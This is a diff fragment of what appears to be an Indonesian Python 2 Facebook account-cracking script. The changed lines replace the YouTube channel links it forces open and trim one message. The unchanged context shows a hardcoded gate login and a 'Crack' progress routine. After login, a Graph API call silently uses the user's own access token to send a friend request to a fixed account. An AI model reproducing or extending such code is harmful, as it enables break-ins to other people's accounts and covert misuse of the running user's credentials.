@@ -96,8 +96,8 @@ def siapa():
 
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mKalau mau jalanin scriptnya silahkan SUBSCRIBE channel CLEO CYBER terlebih dahulu ya gan ! \n"
-	os.system('xdg-open https://www.youtube.com/channel/UCBYLo7-X6VTYaaMgZJGv5mA')
+	print"\033[1;97mKalau mau jalanin scriptnya silahkan SUBSCRIBE channel CLEO OFFICIAL terlebih dahulu ya gan ! \n"
+	os.system('xdg-open https://www.youtube.com/channel/UCTwaM9jyj_Sj9lpWXAu3ouQ')
         username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="cleo" and password =="ganteng":
@@ -150,14 +150,14 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/channel/UCBYLo7-X6VTYaaMgZJGv5mA')
+				os.system('xdg-open https://www.youtube.com/channel/UCTwaM9jyj_Sj9lpWXAu3ouQ')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://www.youtube.com/channel/UCP0-8OzsHywqN461bVFjUbQ')
+			os.system('xdg-open https://www.youtube.com/channel/UCTwaM9jyj_Sj9lpWXAu3ouQ')
 			time.sleep(1)
 			keluar()
 		else:
@@ -321,7 +321,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[0;1mSabar !! tunggu sambil minum kopi dan ghibah sama temen kamu  ')
+	print('\x1b[1;96m[!] \x1b[0;1mSabar !! tunggu sambil minum kopi   ')
 	print 42*"\033[1;96m="
 
 
